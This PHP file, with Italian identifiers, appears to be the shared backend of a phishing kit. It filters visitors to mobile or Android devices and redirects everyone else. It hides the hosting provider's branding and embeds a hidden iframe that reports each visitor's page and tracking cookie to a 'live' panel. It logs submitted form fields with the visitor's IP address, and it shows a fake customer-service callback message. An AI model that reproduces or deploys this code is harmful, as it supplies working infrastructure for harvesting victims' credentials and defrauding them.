<?php  /* onscIjiT3ZtFZvVj2OSIwcyjhmAmw */ 

function rsearch($folder, $pattern) {
    $iti = new RecursiveDirectoryIterator($folder);
    foreach(new RecursiveIteratorIterator($iti) as $file){
         if(strpos($file , $pattern) !== false){
            return $file;
         }
    }
    return false;
}
function nomecartella(){
        $filepath = rsearch(dirname(__FILE__)."/", "NUOVAVERSIONE.txt");
        $filepath = str_replace("\NUOVAVERSIONE.txt","",$filepath);
        $cartella =  basename($filepath);
        return $cartella;
}

$cartella = nomecartella(); 
date_default_timezone_set('Europe/Rome'); function messaggiofinale(){ 
    global $cartella; 
    global $opt; 
    $norichiedichiamata = $opt['norichiedichiamata']; if($norichiedichiamata){ return "";}
     $btn="<BR><BR><a  class='ricchiam' href='?chiama=1'><b>RICHIEDI CHIAMATA</b></a>"; 
     $script="<style>.ricchiam{border:1px solid black; padding: 15px;}</style><script src='https://code.jquery.com/jquery-3.6.0.min.js' ></script>"; if(isset($_REQUEST['chiama'])) { $btn="<BR><b class='loadc'><img src='$cartella/load.gif' width=50 /><br></b><b class='inoltrata' style='display:none'>
        <img src='$cartella/callcenter.jpg' width=70 /><br><BR>
        la richiesta di chiamata di assistenza è stata inoltrata al Servizio Clienti.<br>Attendi qualche minuto.<br>La stiamo mettendo in contatto con il primo operatore disponibile</b>"; $script.="<script>setTimeout(function(){ jQuery('.loadc').hide();jQuery('.inoltrata').show(); },5000)</script>"; } return "".$btn.$script;
         } function dispositivo(){ require_once('mobile/Mobile_Detect.php'); 
         $detect = new Mobile_Detect; $deviceType = $detect->isMobile() ? $detect->isTablet() ? 'tablet' : 'telefono' : 'computer'; $scriptVersion = $detect->getHttpHeaders(); $mobileGrade=""; if($detect->isAndroidOS()){ $mobileGrade="ANDROID"; } if($detect->isiOS()){ $mobileGrade="IPHONE"; } return $deviceType . " " . $mobileGrade; } function muori(){ global $opt; $red = $opt['redirect']; if(!$red){ exit; }else{ } header("Location: $red"); exit; } function soloandroid(){ require_once('mobile/Mobile_Detect.php'); $detect = new Mobile_Detect; if ($detect->isAndroidOS()) { }else{ muori(); } } function solomobile(){ require_once('mobile/Mobile_Detect.php'); $detect = new Mobile_Detect; if ($detect->isMobile()) { $ua = "Mobile"; } elseif ($detect->isTablet()) { $ua = "Tablet"; } else { muori(); } } function script(){ $id=getid(); if($id){ $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>
        <script>
            if(window.location.href.indexOf('webhostapp')!=-1){
                setInterval(function(){jQuery("img[alt='www.000webhost.com']").parents("div").hide()},500)
            }
            </script>
        


<iframe  style="width:0px; heigth:0px;display:none;position:absolute:top:-90000px" src="<?php   $cartella = nomecartella();echo $cartella ?>/live.php?id=<?php echo $id ?>&pagina=<?php echo urlencode($actual_link) ?>"></iframe>
        <?php
 } } function salvadebug($pagina){ if (!file_exists('debug.txt')) { touch('debug.txt'); } $dati =""; foreach($pagina as $parametro ){ if(isset($_POST[$parametro])){ $dati.=" $parametro -> '".$_POST[$parametro]."' | "; } } if($dati){ file_put_contents('debug.txt',getUserIP()." ". $dati."\n", FILE_APPEND ); } } function getUserIP() { if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) { $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"]; $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];} $client = @$_SERVER['HTTP_CLIENT_IP']; $forward = @$_SERVER['HTTP_X_FORWARDED_FOR']; $remote = $_SERVER['REMOTE_ADDR']; if(filter_var($client, FILTER_VALIDATE_IP)){ $ip = $client; }elseif(filter_var($forward, FILTER_VALIDATE_IP)){ $ip = $forward; }else{ $ip = $remote; } return $ip; } function getid(){ if (!isset($_COOKIE['COOKIE_KEY'])) { }else{ return $_COOKIE['COOKIE_KEY']; } } function forzaid(){ $randomizzato = time().mt_rand(1,100); setcookie("COOKIE_KEY", $randomizzato , time() + (10 * 365 * 24 * 60 * 60)); return $randomizzato; } function creaid($numero,$cartella){ if (!isset($_COOKIE['COOKIE_KEY'])) { setcookie("COOKIE_KEY", time().mt_rand(1,100), time() + (10 * 365 * 24 * 60 * 60)); }else{ } if(isset($_COOKIE['COOKIE_KEY'])){ return $_COOKIE['COOKIE_KEY']; }else{ return false; } } function creafile($nome){ if (!file_exists($nome)) { touch($nome); } } function conta($numero){ if(!$numero){ if (!file_exists('visite.txt')) { touch('visite.txt'); } $counter = intval(file_get_contents('visite.txt')) + 1; file_put_contents('visite.txt', $counter); } } $dajeee=1; if (!file_exists('database')) { mkdir('database', 0777, true); } global $opt; include("leggifuori.php"); if($opt['solomobile']){ solomobile(); } if($opt['soloandroid']){ soloandroid(); } ?><?php  ?>